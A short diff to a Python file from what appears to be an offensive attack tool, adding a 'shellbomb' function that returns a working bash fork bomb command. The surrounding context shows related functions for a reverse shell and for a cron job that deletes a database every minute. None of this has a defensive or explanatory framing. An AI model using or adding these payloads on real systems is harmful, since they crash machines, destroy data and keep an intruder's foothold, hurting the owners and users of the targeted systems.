@@ -241,6 +241,11 @@ def reverse_shell(target,target_port,cmd):
 	debug_print(cmd)
 	return cmd
 
+def shellbomb(target,target_port,cmd):
+	cmd = "/bin/bash -c '.() { .|.& } && .'"
+	debug_print(cmd)
+	return cmd
+
 def crontab_rm_db(target,target_port,cmd):
 	cmd = rm_db(target,target_port,cmd)
 	crontab_cmd = '* * * * * bash -c "%s"\n'%cmd
